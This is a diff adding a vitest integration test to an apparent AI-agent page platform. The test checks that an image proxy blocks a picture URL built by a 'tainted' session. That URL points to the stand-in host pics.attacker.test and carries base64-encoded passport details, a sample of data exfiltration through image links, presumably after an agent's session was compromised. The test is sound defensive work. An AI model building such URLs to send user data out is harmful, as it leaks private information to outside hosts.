@@ -1,7 +1,7 @@
 // Pages agents make (pages.ts, server/pages.ts, tools/page-tools.ts): the TSX compiles to the kit's script and only
 // the kit's modules import; a page's link is its capability and serves it sandboxed with the kit, its data and state;
 // what broke in a browser reaches page_read; a change bumps the version; the page fetches only allowed APIs.
-import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
 import { createServer } from "node:net";
 import { tmpdir } from "node:os";
@@ -237,5 +237,34 @@ describe("pages (integration)", () => {
     expect((await call("page_show", { page: page.id })).text).toContain("A walk in Almaty");
     expect((await call("page_list", {})).text).toContain(page.id);
     expect((await call("page_show", { page: "nothing" })).isError).toBe(true);
+  });
+
+  it("fetches a page's pictures, except one the hub held (policy/pictures.ts): an earlier copy of it at most", async () => {
+    const page = hub.pages.list().find((p) => p.title === "A walk in Almaty")!;
+    const img = (url: string) => open(`${page.url}img?url=${encodeURIComponent(url)}`);
+    const PNG = Buffer.from("89504e470d0a1a0a", "hex");
+    // No network in tests: the proxy's fetch answers here, and says what it was asked for.
+    const fetched: string[] = [];
+    const image = vi.spyOn(hub.media, "image").mockImplementation(async (raw: unknown) => (fetched.push(String(raw)), { data: PNG, type: "image/png" }));
+    const cached = vi.spyOn(hub.media, "cachedImage").mockReturnValue(undefined);
+    try {
+      const plain = "https://upload.wikimedia.org/park.png";
+      expect((await img(plain)).status).toBe(200);
+      // An address a tainted session put together, to a host nobody named.
+      const leak = `https://pics.attacker.test/p.png?d=${Buffer.from("passport 4510 123456").toString("base64")}`;
+      hub.pictures.decide({ id: "s-page", tainted: true }, [leak], () => ({ texts: [], knownHost: () => false }));
+      expect(hub.pictures.state(leak)).toBe("held");
+      const held = await img(leak);
+      expect(held.status).toBe(403);
+      expect((await held.json()).error).toMatch(/held/);
+      expect(fetched).toEqual([plain]);
+      // A copy fetched before it was held sends nothing out.
+      cached.mockReturnValue({ data: PNG, type: "image/png" });
+      expect((await img(leak)).status).toBe(200);
+      expect(fetched).toEqual([plain]);
+    } finally {
+      image.mockRestore();
+      cached.mockRestore();
+    }
   });
 });
